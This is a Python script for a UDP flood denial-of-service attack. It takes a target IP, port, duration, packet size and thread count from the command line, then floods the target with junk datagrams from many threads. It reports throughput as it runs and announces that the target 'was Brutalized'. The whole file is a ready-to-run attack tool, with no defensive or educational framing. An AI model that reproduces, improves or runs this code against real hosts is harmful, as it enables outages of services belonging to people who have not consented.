import sys
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep
from pystyle import *

class Brutalize:
    def __init__(self, ip, port, force, threads, duration):
        self.ip = ip
        self.port = port
        self.force = force  
        self.threads = threads  
        self.duration = duration 

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        start_time = time()
        threads = []

        for _ in range(self.threads):
            thread = Thread(target=self.send)
            thread.start()
            threads.append(thread)

        info_thread = Thread(target=self.info)
        info_thread.start()

        while time() - start_time < self.duration:
            sleep(0.1)
        
        self.stop()

        for thread in threads:
            thread.join()
        
        info_thread.join()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' ' * 20}"), end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

ascii = r''''''

banner = r"""
""".replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white

blue = Col.StaticMIX((Col.blue, Col.black))
bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
purple = Col.StaticMIX((Col.purple, blue, Col.white))

def init():
    System.Size(140, 40)
    System.Title(".t.c.p .-. .b.y.v.l.a.d.i.m.i.".replace('.', ''))
    Cursor.HideCursor()

init()

def stage(text, symbol='...'):
    col1 = purple
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"

def error(text, start='\n'):
    input(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()

def main():
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))

    if len(sys.argv) != 6:
        print("Sử dụng: python tcp.py <ip> <port> <duration> <packet> <threads>")
        sys.exit(1)

    ip = sys.argv[1]
    try:
        port = int(sys.argv[2])
        duration = int(sys.argv[3])
        force = int(sys.argv[4])
        threads = int(sys.argv[5])
    except ValueError:
        error("Error! Please enter correct numbers for port, packet size, threads, and duration.")

    print()
    cport = '' if port is None else f'{purple}:{fluo2}{port}'
    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')

    brute = Brutalize(ip, port, force, threads, duration)
    try:
        brute.flood()
    except Exception as e:
        brute.stop()
        error(f"A fatal error has occurred: {e}", '')
    
    print(stage(f"Attack completed. {fluo2}{ip}{cport}{white} was Brutalized with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)

    input(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))

if __name__ == '__main__':
    main()